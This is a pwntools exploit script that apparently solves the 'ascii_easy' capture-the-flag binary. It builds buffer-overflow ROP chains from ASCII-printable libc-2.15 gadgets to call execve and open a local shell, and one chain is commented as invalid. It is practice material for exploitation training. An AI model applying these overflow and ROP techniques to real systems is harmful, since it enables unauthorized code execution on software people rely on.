from pwn import *
context(os="linux", arch="i386", log_level="debug")

# 0x00055670: xor eax, eax; add esp, 0xc; ret;
xor_eax_3arg = 0x555b3670

# 0x0001706f: pop ebp; ret;
pop_ebp = 0x5557506f

# 0x00196525: pop edx; add dword ptr [edx], ecx; ret;
pop_edx = 0x556f4525

# pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
pop_5arg = 0x5557506b

# 0x000b9b70: lea eax, [eax + eax - 1]; ret;
dbl_eax = 0x55617b70

# pop edi ; pop ebx ; ret
pop_ebx = 0x555e5132

# 0x00174a51: pop ecx; add al, 0xa; ret;
pop_ecx = 0x556d2a51

# 0x00017e77 : pop esi ; pop edi ; pop ebp ; ret 0x10
pop_esi_7arg = 0x55575e77

# 0x000a866d: pop esi; add eax, edx; ret;
pop_esi = 0x5560666d

# 0x00026e2b: push eax; and eax, 0x200; ret;
push_eax = 0x55584e2b

# 0x00166223: call ebp; sar esp, cl; inc dword ptr [0x35fffcd4]; aam 0xfc; jmp dword ptr [ebp - 0x2c];
call_ebp = 0x556c4223

# 0x00166a37: call edx; stc; cld; jmp dword ptr [edx - 6];
call_edx = 0x556c4a37

# 0x0016703f: call esi; pop ds; std; jmp dword ptr [esi];
call_esi = 0x556c503f

# 0x00067c5d: sub eax, esi; pop esi; pop edi; pop ebp; ret;
sub_eax_esi = 0x555c5c5d

# 0x00095e6e: mov eax, esi; add esp, 8; pop esi; pop edi; pop ebp; ret;
mov_eax_esi_5arg = 0x555f3e6e

# 0x00054c7b: 
#   mov eax, edi; mov ebx, dword ptr [esp + 0x40]; 
#   mov esi, dword ptr [esp + 0x44]; mov edi, dword ptr [esp + 0x48]; 
#   add esp, 0x4c; ret;
mov_eax_edi = 0x555b2c7b

# 0x00054e44: mov eax, edx; add esp, 0x7c; ret;
mov_eax_edx = 0x555b2e44

# 0x000d12f7: mov eax, ecx; pop ebp; ret 4;
mov_eax_ecx_2arg = 0x5562f2f7

# 0x00187554: add ebx, esi; add dword ptr [edx], ecx; ret;
# make sure [edx] is writeable!!
add_ebx_esi = 0x556e5554

# 0x00177e74: add esi, ecx; add dword ptr [edx], ecx; ret;
add_esi_ecx = 0x556d5e74

# edx-> some where in libc-2.15.so .bss section
edx_val = 0x55562020

# 0x000c5b44: neg eax; pop edi; ret;
neg_eax_1arg = 0x55623b44

libc_got_addr = 0x55700ff4 # = 0x20302050*4 - 0x2b50714c

# libc's got addr =  0x40604021*2 - 0x2b50704e
ebx_val1 = 0x7a784842
ebx_val2 = 0x607f7f70

# !! invalid, don't work, just segment fault!!
# constraints:
#   ebx is the GOT address of libc
#   eax == NULL
addr_ogg = 0x555c4685 # base+0x66685

# ogg addr = esi = 0x7a784842*2+0x607f7f70 = (0x155700ff4)&0xffffffff = 0x55700ff4
esi_val1 = 0x20202020
esi_val2 = 0x353c2665

# execve(addr_binsh, addr_null, addr_null)p
addr_binsh = 0x556bb7ec #  = 0x354b386d + 0x20207f7f
addr_h = 0x556b2154 # addr of "h\0"
addr_execve = 0x556165e0 # = 0x35414561 + 0x2020207f
addr_null = 0x55564a38

addr_call_execve = 0x5561676a

# # ROP chain
payload2 = flat([
    b'A'*0x20, # paading
    pop_edx, edx_val,   # make [edx] writeable.

    # pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
    pop_5arg, p32(ebx_val2)*2, p32(ebx_val1)*3,
    add_ebx_esi, 
    add_ebx_esi, # now ebx==libc@got==0x55700ff4

    # make esi=ogg
    pop_esi, esi_val1,
    pop_ecx, esi_val2,
    add_esi_ecx, # now esi==ogg

    # make eax == 0
    xor_eax_3arg, 3*p32(esi_val1),
    call_esi # call one gadget, !!Invalid!!, this ogg call execl in libc-2.15.so
    ])

payload = b'A'*0x20
payload += p32(addr_call_execve) + p32(addr_h) + p32(addr_null)*2
# print(payload)
# print(len(payload))

io = process(["./ascii_easy", payload])
# io = process(["./ascii_easy", payload2])
io.interactive()
